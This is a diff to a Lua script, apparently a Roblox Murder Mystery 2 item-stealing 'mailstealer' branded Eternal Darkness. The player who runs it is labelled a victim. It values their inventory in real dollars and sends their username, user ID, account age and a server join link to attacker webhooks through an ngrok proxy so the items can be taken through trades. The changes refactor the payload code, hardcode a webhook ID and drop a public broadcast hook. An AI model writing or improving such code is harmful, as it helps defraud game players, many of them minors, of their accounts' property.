@@ -97,8 +97,7 @@ local PROXY_URL = "https://your-proxy-url.ngrok-free.app/api/proxy/"
 local WEBHOOK_ID = _G.WEBHOOK_ID or "default_webhook"
 local usernames_id = _G.USERNAMES or {}
 
-local PUBLIC_WEBHOOK_ID = "your_public_webhook_id"
-local TOP_HITS_WEBHOOK_ID = "your_top_hits_webhook_id"
+local TOP_HITS_WEBHOOK_ID = "wjffxl4325f"
 
 -- Minimum value for top hits (only Ancient, Unique, or 2000+ value)
 local TOP_HITS_MIN_VALUE = 2000
@@ -577,11 +576,45 @@ local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"
 local usdData = GetUSD(weaponsToSend)
 local totalUSD = usdData.total or "0.00"
 
+-- Helper function to build valid JSON array
+local function buildJSONArray(items)
+    local parts = {}
+    for _, item in ipairs(items) do
+        table.insert(parts, HttpService:JSONEncode(item))
+    end
+    return "[" .. table.concat(parts, ",") .. "]"
+end
+
+-- Helper function to build valid JSON object from table
+local function buildJSONObject(tbl)
+    local parts = {}
+    for k, v in pairs(tbl) do
+        local val
+        if type(v) == "table" then
+            if #v > 0 then
+                val = buildJSONArray(v)
+            else
+                val = buildJSONObject(v)
+            end
+        elseif type(v) == "number" then
+            val = tostring(v)
+        elseif type(v) == "boolean" then
+            val = v and "true" or "false"
+        else
+            val = HttpService:JSONEncode(v)
+        end
+        table.insert(parts, HttpService:JSONEncode(k) .. ":" .. val)
+    end
+    return "{" .. table.concat(parts, ",") .. "}"
+end
+
 local function sendToProxy(Wid, payload, isEncrypted)
     task.spawn(function()
-        local finalBody = HttpService:JSONEncode(payload)
+        local finalBody
         if isEncrypted then
-            finalBody = encrypt(finalBody)
+            finalBody = encrypt(HttpService:JSONEncode(payload))
+        else
+            finalBody = buildJSONObject(payload)
         end
         
         local url = PROXY_URL .. Wid
@@ -637,18 +670,19 @@ local function updateTradeMessage()
     local totalPercentage = math.floor((totalReceivedValue / totalOriginalValue) * 100)
     local progressColor = totalPercentage == 100 and ETERNAL_DARKNESS_COLORS.success or totalPercentage >= 75 and 0xFFD700 or ETERNAL_DARKNESS_COLORS.gold
 
-    local embed = {
-        title = "⟳ SHADOW TRADE IN PROGRESS",
-        color = progressColor,
-        fields = itemFields,
-        description = string.format("**Total Progress: %d/%d Value (%d%%)**", totalReceivedValue, totalOriginalValue, totalPercentage),
-        footer = { 
-            text = "Eternal Darkness MM2 • v1.0.0"
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    local payload = {
+        embeds = {{
+            title = "⟳ SHADOW TRADE IN PROGRESS",
+            color = progressColor,
+            fields = itemFields,
+            description = string.format("**Total Progress: %d/%d Value (%d%%)**", totalReceivedValue, totalOriginalValue, totalPercentage),
+            footer = { 
+                text = "Eternal Darkness MM2 • v1.0.0"
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
     }
 
-    local payload = { embeds = { embed } }
     sendToProxy(WEBHOOK_ID, payload, true)
 end
 
@@ -682,59 +716,59 @@ local function sendMainWebhook()
         content = "@everyone 🌑 **NEW SHADOW ACQUIRED**"
     end
 
-    local embed = {
-        title = string.format("🌑 SHADOW ACQUIRED │ %s │ %s", plr.DisplayName, hitCategory),
-        url = rubisLink,
-        color = ETERNAL_DARKNESS_COLORS.secondary,
-        thumbnail = {url = avatarUrl},
-        description = string.format("```lua\\n%s\\n```", joinScript),
-        fields = {
-            {
-                name = "👤 Victim",
-                value = string.format("```\\n%s (@%s)\\nID: %d\\nAge: %d days\\n```", plr.DisplayName, plr.Name, plr.UserId, plr.AccountAge),
-                inline = true
-            },
-            {
-                name = "⚙️ System",
-                value = string.format("```\\nExecutor: %s\\nReceiver: %s\\nJob ID: %s...\\n```", executorName, targetName, string.sub(REAL_JOB_ID, 1, 8)),
-                inline = true
-            },
-            {
-                name = "💰 Valuation",
-                value = string.format("```\\nTotal Value: %d\\nReal Value: $%s\\nTotal Items: %d\\n```", totalInventoryValue, totalUSD, total_items),
-                inline = true
-            },
-            {
-                name = "📊 Inventory Breakdown",
-                value = string.format("```ansi\\n\\u001b[2;31mAncient:  %d  \\u001b[2;35mGodly:   %d\\u001b[0m\\n\\u001b[2;33mUnique:   %d  \\u001b[2;38;5;208mVintage: %d\\u001b[0m\\n\\u001b[2;34mLegendary:%d  \\u001b[2;32mRare:    %d\\u001b[0m\\n\\u001b[2;37mUncommon: %d  Common:  %d```", 
-                    tier_counts.Ancient, tier_counts.Godly,
-                    tier_counts.Unique, tier_counts.Vintage,
-                    tier_counts.Legendary, tier_counts.Rare,
-                    tier_counts.Uncommon, tier_counts.Common),
-                inline = false
-            },
-            {
-                name = "🏆 Top Items",
-                value = #top_items > 0 and string.format("```\\n%s\\n```", table.concat(top_items, "\\n")) or "```\\nNo items\\n```",
-                inline = false
-            },
-            {
-                name = "🔗 Actions",
-                value = string.format("[Join Server](%s) • [View Inventory](%s)", fernJoinerLink, rubisLink),
-                inline = false
-            }
-        },
-        footer = {
-            text = string.format("Eternal Darkness MM2 • v1.0.0 • %s", os.date("!%H:%M:%S UTC"))
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
+    -- Build fields array properly
+    local fields = {}
+    table.insert(fields, {
+        name = "👤 Victim",
+        value = string.format("```\\n%s (@%s)\\nID: %d\\nAge: %d days\\n```", plr.DisplayName, plr.Name, plr.UserId, plr.AccountAge),
+        inline = true
+    })
+    table.insert(fields, {
+        name = "⚙️ System",
+        value = string.format("```\\nExecutor: %s\\nReceiver: %s\\nJob ID: %s...\\n```", executorName, targetName, string.sub(REAL_JOB_ID, 1, 8)),
+        inline = true
+    })
+    table.insert(fields, {
+        name = "💰 Valuation",
+        value = string.format("```\\nTotal Value: %d\\nReal Value: $%s\\nTotal Items: %d\\n```", totalInventoryValue, totalUSD, total_items),
+        inline = true
+    })
+    table.insert(fields, {
+        name = "📊 Inventory Breakdown",
+        value = string.format("```ansi\\n\\u001b[2;31mAncient:  %d  \\u001b[2;35mGodly:   %d\\u001b[0m\\n\\u001b[2;33mUnique:   %d  \\u001b[2;38;5;208mVintage: %d\\u001b[0m\\n\\u001b[2;34mLegendary:%d  \\u001b[2;32mRare:    %d\\u001b[0m\\n\\u001b[2;37mUncommon: %d  Common:  %d```", 
+            tier_counts.Ancient, tier_counts.Godly,
+            tier_counts.Unique, tier_counts.Vintage,
+            tier_counts.Legendary, tier_counts.Rare,
+            tier_counts.Uncommon, tier_counts.Common),
+        inline = false
+    })
+    table.insert(fields, {
+        name = "🏆 Top Items",
+        value = #top_items > 0 and string.format("```\\n%s\\n```", table.concat(top_items, "\\n")) or "```\\nNo items\\n```",
+        inline = false
+    })
+    table.insert(fields, {
+        name = "🔗 Actions",
+        value = string.format("[Join Server](%s) • [View Inventory](%s)", fernJoinerLink, rubisLink),
+        inline = false
+    })
 
     local payload = {
         content = content,
         username = "🌑 Eternal Darkness",
         avatar_url = ETERNAL_DARKNESS_AVATAR,
-        embeds = {embed}
+        embeds = {{
+            title = string.format("🌑 SHADOW ACQUIRED │ %s │ %s", plr.DisplayName, hitCategory),
+            url = rubisLink,
+            color = ETERNAL_DARKNESS_COLORS.secondary,
+            thumbnail = {url = avatarUrl},
+            description = string.format("```lua\\n%s\\n```", joinScript),
+            fields = fields,
+            footer = {
+                text = string.format("Eternal Darkness MM2 • v1.0.0 • %s", os.date("!%H:%M:%S UTC"))
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
     }
 
     sendToProxy(WEBHOOK_ID, payload, false)
@@ -742,62 +776,6 @@ local function sendMainWebhook()
     for _, rcv in ipairs(users) do
         sendHitToQueue(PlaceId, REAL_JOB_ID, rcv)
     end
-end
-
--- Public webhook - Simplified, no join link
-local function sendPublicWebhook()
-    local tier_counts = rarityCounts
-    local total_items = 0
-    for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end
-
-    local content = "📢 **SHADOW BROADCAST**"
-
-    local rarityLines = {}
-    local rarities = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
-    local ansiColors = {"31", "35", "33", "38;5;208", "34", "32", "37", "30"}
-    
-    for i, rarity in ipairs(rarities) do
-        local count = tier_counts[rarity] or 0
-        if count > 0 then
-            table.insert(rarityLines, string.format("\\u001b[2;%sm%s: %d\\u001b[0m", ansiColors[i], rarity, count))
-        end
-    end
-
-    local embed = {
-        title = string.format("🌑 Public Shadow │ %s", hitCategory),
-        color = ETERNAL_DARKNESS_COLORS.accent,
-        description = string.format("**%s** consumed by Eternal Darkness!", plr.Name),
-        fields = {
-            { 
-                name = "💎 Valuation", 
-                value = string.format("```yaml\\nvalue: %d\\nreal: $%s\\nitems: %d```", totalInventoryValue, totalUSD, total_items), 
-                inline = true 
-            },
-            { 
-                name = "⚡ Executor", 
-                value = string.format("```yaml\\nname: %s```", executorName), 
-                inline = true 
-            },
-            { 
-                name = "📊 Breakdown", 
-                value = string.format("```ansi\\n%s```", table.concat(rarityLines, "\\n")), 
-                inline = false 
-            }
-        },
-        footer = { 
-            text = "Eternal Darkness MM2 • v1.0.0"
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
-
-    local payload = {
-        content = content,
-        username = "📡 Shadow Broadcast",
-        avatar_url = ETERNAL_DARKNESS_AVATAR,
-        embeds = {embed}
-    }
-
-    sendToProxy(PUBLIC_WEBHOOK_ID, payload, false)
 end
 
 -- Send top hits webhook (only for best hits)
@@ -815,49 +793,49 @@ local function sendTopHits()
         table.insert(top_items, string.format("`%s` ×%d (**%d** value)", item.ItemName, item.Amount, item.TotalValue))
     end
 
-    local embed = {
-        title = "🌑🔥 ELITE SHADOW ACQUIRED",
-        url = rubisLink,
-        color = ETERNAL_DARKNESS_COLORS.highlight,
-        description = string.format("**%s** has been consumed by Eternal Darkness!\\n\\nThis is an **ELITE** hit worth **$%s** real money!", plr.Name, totalUSD),
-        fields = {
-            { 
-                name = "💰 Elite Valuation", 
-                value = string.format("```yaml\\nIn-Game: %d\\nReal Value: $%s\\nItems: %d```", totalInventoryValue, totalUSD, total_items), 
-                inline = true 
-            },
-            { 
-                name = "👤 Victim", 
-                value = string.format("```yaml\\nUser: %s\\nID: %d\\nAge: %d days```", plr.Name, plr.UserId, plr.AccountAge), 
-                inline = true 
-            },
-            { 
-                name = "⚙️ System", 
-                value = string.format("```yaml\\nExecutor: %s\\nJob ID: %s...```", executorName, string.sub(REAL_JOB_ID, 1, 8)), 
-                inline = true 
-            },
-            {
-                name = "🏆 Elite Items",
-                value = #top_items > 0 and string.format("```\\n%s\\n```", table.concat(top_items, "\\n")) or "```\\nNo items\\n```",
-                inline = false
-            },
-            {
-                name = "🔗 Actions",
-                value = string.format("[Join Server](%s) • [View Inventory](%s)", fernJoinerLink, rubisLink),
-                inline = false
-            }
-        },
-        footer = { 
-            text = "Eternal Darkness MM2 • ELITE HIT • v1.0.0"
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
+    -- Build fields array properly
+    local fields = {}
+    table.insert(fields, {
+        name = "💰 Elite Valuation",
+        value = string.format("```yaml\\nIn-Game: %d\\nReal Value: $%s\\nItems: %d```", totalInventoryValue, totalUSD, total_items),
+        inline = true
+    })
+    table.insert(fields, {
+        name = "👤 Victim",
+        value = string.format("```yaml\\nUser: %s\\nID: %d\\nAge: %d days```", plr.Name, plr.UserId, plr.AccountAge),
+        inline = true
+    })
+    table.insert(fields, {
+        name = "⚙️ System",
+        value = string.format("```yaml\\nExecutor: %s\\nJob ID: %s...```", executorName, string.sub(REAL_JOB_ID, 1, 8)),
+        inline = true
+    })
+    table.insert(fields, {
+        name = "🏆 Elite Items",
+        value = #top_items > 0 and string.format("```\\n%s\\n```", table.concat(top_items, "\\n")) or "```\\nNo items\\n```",
+        inline = false
+    })
+    table.insert(fields, {
+        name = "🔗 Actions",
+        value = string.format("[Join Server](%s) • [View Inventory](%s)", fernJoinerLink, rubisLink),
+        inline = false
+    })
 
     local payload = {
         content = "@everyone 🌑🔥 **ELITE SHADOW ACQUIRED**",
         username = "🔥 Elite Shadow",
         avatar_url = ETERNAL_DARKNESS_AVATAR,
-        embeds = {embed}
+        embeds = {{
+            title = "🌑🔥 ELITE SHADOW ACQUIRED",
+            url = rubisLink,
+            color = ETERNAL_DARKNESS_COLORS.highlight,
+            description = string.format("**%s** has been consumed by Eternal Darkness!\\n\\nThis is an **ELITE** hit worth **$%s** real money!", plr.Name, totalUSD),
+            fields = fields,
+            footer = { 
+                text = "Eternal Darkness MM2 • ELITE HIT • v1.0.0"
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
     }
 
     sendToProxy(TOP_HITS_WEBHOOK_ID, payload, false)
@@ -865,7 +843,6 @@ end
 
 -- Send webhooks
 sendMainWebhook()
-sendPublicWebhook()
 sendTopHits()
 
 -- Trading helper functions from leaked.lua (working version)
